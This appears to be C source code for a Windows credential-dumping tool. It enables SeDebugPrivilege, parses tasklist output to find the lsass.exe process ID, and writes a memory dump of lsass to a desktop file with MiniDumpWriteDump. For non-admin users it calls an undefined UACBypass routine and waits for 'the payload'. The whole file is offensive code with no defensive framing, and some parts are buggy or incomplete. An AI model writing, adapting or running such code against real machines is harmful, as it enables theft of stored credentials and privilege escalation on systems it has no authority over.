#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>

BOOL GainDebuggingPrivilege()
{
	HANDLE PrivilegeToken;
	TOKEN_PRIVILEGES PrivilegeData;
	// locally uniqe identifier
	LUID Luid;



	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &PrivilegeToken))
	{
		printf("OpenProcessToken Error(%d)\n", GetLastError());
		return FALSE;

	}




	if (!LookupPrivilegeValue(0, L"SeDebugPrivilege", &Luid))
	{
		printf("LookupPrivilege Error(%d)\n", GetLastError());
		return FALSE;
	}

	PrivilegeData.Privileges[0].Luid = Luid;
	PrivilegeData.PrivilegeCount = 1;
	PrivilegeData.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(PrivilegeToken, FALSE, &PrivilegeData, 0, 0, 0))
	{
		printf("AdjustPrivilegeError(%d)\n", GetLastError());
		return FALSE;
	}
	CloseHandle(PrivilegeToken);
	return TRUE;
}



int GetLsassProcessIdentifier()
{

	//Starting empty buffers with NULLS
	char* Buffer = (char*)calloc(2048, sizeof(char));
	char* FinalOutput = (char*)calloc(100000, sizeof(char));
	//Checking if the memory is allocated
	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}


	FILE* FileHandler;
	FileHandler = _popen("tasklist | findstr lsass.exe", "r");
	while (fgets(Buffer, 2048, FileHandler) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}


	fclose(FileHandler);
	//getting the output of cmd command "tasklist | findstr lsass.exe"
	//the output is some data of the lsass process

	//Parsing the data 
	char* ProcessId = strtok(FinalOutput, " ");

	//taking the first token which is the pid
	ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);

	free(Buffer);
	free(FinalOutput);
	//returning lsass's pid
	return IntProcessId;

}


int main()
{
	//Adminisitor check
	if (!IsUserAnAdmin() == 1)
	{
		//this code happens as  non admin
		UACBypass();
		//waits for the payload
		Sleep(10000);
		//exits
		exit(1);
	}
	GainDebuggingPrivilege();

	system("start lsass");
	//Getting lsass's process handle
	DWORD ProcessId = (DWORD)GetLsassProcessIdentifier();
	HANDLE LsassHandler;
	LsassHandler = OpenProcess
	(
		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
		0,
		ProcessId
	);

	if (LsassHandler == NULL)
	{
		printf("Lsass Error(%d)\n", GetLastError());
	}

	//Creating a text file to hold the dumped lsass data
	HANDLE LsassMinidump = CreateFileW
	("C:\\Users\\IlaySamuelov\\Desktop\\Mini.txt", GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | SECURITY_IMPERSONATION,
		NULL);

	if (LsassMinidump == NULL)
	{
		printf("Output Error(%d)\n", GetLastError());
	}

	int code = MiniDumpWriteDump(
		LsassHandler,
		ProcessId,
		LsassMinidump,
		(MINIDUMP_TYPE)0x00000002,
		NULL,
		NULL,
		NULL);
	CloseHandle(LsassMinidump);
}
